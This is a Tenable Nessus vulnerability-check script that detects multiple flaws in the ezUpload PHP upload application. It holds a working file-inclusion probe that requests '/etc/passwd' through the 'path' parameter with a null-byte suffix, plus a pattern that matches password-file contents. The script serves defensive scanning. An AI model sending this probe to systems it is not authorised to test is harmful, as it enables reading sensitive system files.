#
# (C) Tenable Network Security
#


if (description) {
  script_id(19418);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2005-2616", "CVE-2005-4308", "CVE-2005-4309");
  script_bugtraq_id(14534, 15918, 15919);
  script_xref(name:"OSVDB", value:"21911");
  script_xref(name:"OSVDB", value:"21912");

  script_name(english:"ezUpload <= 2.2 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in ezUpload <= 2.2");
 
  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple flaws.

Description :

The remote host appears to be running ezUpload, a commercial upload
script written in PHP. 

The installed version of ezUpload allows remote attackers to control
the 'path' and 'mode' parameters used when including PHP code in
several scripts.  By leveraging this flaw, an attacker may be able to
view arbitrary files on the remote host and execute arbitrary PHP
code, possibly taken from third-party hosts.  Successful exploitation
may depend on PHP's 'magic_quotes_gpc' and 'allow_url_fopen' settings. 

In addition, it reportedly fails to sanitize input passed to various
parameters in the search module before using it in database queries,
which opens the application up to SQL injection as well as cross-site
scripting attacks. 

See also :

http://packetstorm.linuxsecurity.com/0508-exploits/ezuploadRemote.txt
http://pridels.blogspot.com/2005/12/ezupload-pro-vuln.html

Solution : 

Unknown at this time.

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit one of the flaws to read /etc/passwd.
  req = http_get(
    item:string(
      dir, "/file.php?",
      "path=/etc/passwd%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing 
    #     remote URLs might still work.
    egrep(string:res, pattern:"Warning.*: *main\(/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Warning.*: .+ Failed opening '/etc/passwd.+for inclusion")
  ) {
    security_warning(port);
    exit(0);
  }
}
